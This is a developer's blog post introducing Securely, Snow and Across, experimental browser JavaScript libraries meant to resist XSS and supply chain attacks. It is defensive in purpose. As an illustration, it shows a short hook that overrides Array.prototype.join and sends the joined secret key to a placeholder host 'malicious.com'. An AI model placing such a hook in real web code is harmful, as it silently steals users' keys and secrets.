---
layout: page
title: My contribution attempt to the browser javascript supply chain attack problem
url: https://weizman.github.io/
date: 18/07/2021
description: Introducing Securely, Snow and Across to help fight browser javascript supply chain attacks
keywords: browser, javascript, supply chain attack, security, xss, securely, snow, across
---

## Introducing Securely 🔒, Snow ❄️ and Across ↔

> *tl;dr - Today I share my "side project" for the past year, three browser javascript security libraries that aim to perform as
platforms for creating web apps that are more resilient to and limiting of unwanted code execution such as XSS and javascript supply chain attacks:*

#### [Across ↔](https://github.com/weizman/across)

Across standard allows different scripts within the same web application to communicate with each other by passing messages between one another securely.

[🎬 Live Demo](https://weizman.github.io/across/demo/) | 
[📖 Technical explanation](https://github.com/weizman/across/wiki/Introducing-Across#across-technically-explained) | 
[⚙️ Installation and usage](https://github.com/weizman/across#install) | 
[👩🏽‍💻 Source Code](https://github.com/weizman/across) | 
[💪🏻 Motivation behind this project](https://github.com/weizman/across/wiki/Introducing-Across)

#### [Snow ❄️](https://github.com/weizman/snow)

Snow aspires to standardize how to recursively own newborn windows within a browser webpage, from the context of the webpage itself.

[🎬 Live Demo](https://weizman.github.io/snow/demo/) | 
[📖 Technical explanation](https://github.com/weizman/snow/wiki/Introducing-Snow#why-snow-solves-a-non-trivial-problem) | 
[⚙️ Installation and usage](https://github.com/weizman/snow#usage) | 
[👩🏽‍💻 Source Code](https://github.com/weizman/snow) | 
[💪🏻 Motivation behind this project](https://github.com/weizman/snow/wiki/Introducing-Snow)

#### [Securely 🔒](https://github.com/weizman/securely)

Securely allows you to call native APIs using their original behaviour even if they were tampered within the web app.

[🎬 Live Demo](https://weizman.github.io/securely/demo/) | 
[📖 Technical explanation](https://github.com/weizman/securely#securely-technically-explained-whats-the-s-suffix-for) | 
[⚙️ Installation and usage](https://github.com/weizman/securely#usage) | 
[👩🏽‍💻 Source Code](https://github.com/weizman/securely)

**`Across` is built on top of `Snow`. Both `Across` and `Snow` are built on top of `Securely`.**

**⚠️ These technologies are currently experimental!**

## The [Supply Chain Attacks](https://www.google.com/search?q=javascript+website+supply+chain+attack) Problem

In general, the ability to execute unwanted code within a website is still a major problem.
Doing so with XSS is less common these days, but with infection of the supply chain web apps which is a rising issue, it's still very much possible.

To prevent such attacks, there are many different areas to defend. 
In my attempt, I focus on the real time prevention in the browser. 
Or in other words, what can attackers do once they successfully run within the website in the browser, and what I can do to make it harder for them?

### [Securely 🔒](https://github.com/weizman/securely)

One thing attackers can do is to use the native option of javascript to override builtin functionalities and by that potentially have
the website legit code go through their malicious hooks and leak sensitive information:

```javascript
/* supply chain attack */

const desc = Object.getOwnPropertyDescriptor(Array.prototype, 'join');
const join = desc.value;
desc.value = function(separator) {
    const ret = join.call(this, separator);
    fetch('https://malicious.com/steal-key?key=' + ret);
    return ret;
}
Object.defineProperty(Array.prototype, 'join', desc);
```

```javascript
/* website legit code */

function constructKey() {
  const keyParts = getSecretKeyParts();
  // this goes through attacker's hook!
  const key = keyParts.join('-');
  return key;
}
```

To that problem there are different approachs that are currently being pushed on.

For example, the approach taken by [Consensys](https://github.com/consensys) [MetaMask](https://github.com/metamask)'s [LavaMoat](https://github.com/lavamoat)
which runs on [Endo](https://github.com/endojs)'s [SES](https://github.com/endojs/endo) technology is the lockdown method, which is generally 
to freeze the ability to apply such hooks in the first place to prevent such attacks exactly.

**A lax alternative to this approach is [Securely 🔒](https://github.com/weizman/securely).**

Securely permits the web app and all js code that runs within it to apply such hooks out of belief that
these hooks are a legitimate and unseparatable part of the service provided by many third party vendors, especially in websites.

Instead, **Securely allows you to declare what native functionalities you might need to use in your web app** that you want to avoid any potential hooks
and **grants you exculsive access to them when needed:**

```javascript
const secure = require('@weizman/securely');
const securely = secure(window, {
    objects: {
        'document': ['createElement'],
        'window': ['fetch'],
    },
    prototypes: {
        'Array': ['includes', 'push', 'join'],
    }
});
```

So to go back to the example above, if you need to use `Array.prototype.join` native API to safely construct your key, but still want to allow legitimate
js code in your website to hook it for whatever reason, you can use Securely to achieve that:

```javascript
/* website legit code using Securely */

function constructKey() {
  const keyParts = getSecretKeyParts();
  // this does NOT goes through attacker's hook!
  const key = securely(() => keyParts.joinS('-')); // 'S' stands for Securely!
  return key;
}
```

This infect allows you to avoid potential hooks or go through them when needed, depends on the usecase, which can be very affective 
against supply chain attacks when executing sensitive operations.

> *To dive into Securely, the source code, how to install and use, how and why it works and designed*
> *the way it is and to see a live demonstration of how it works refer to the resources [listed above](#securely-)*

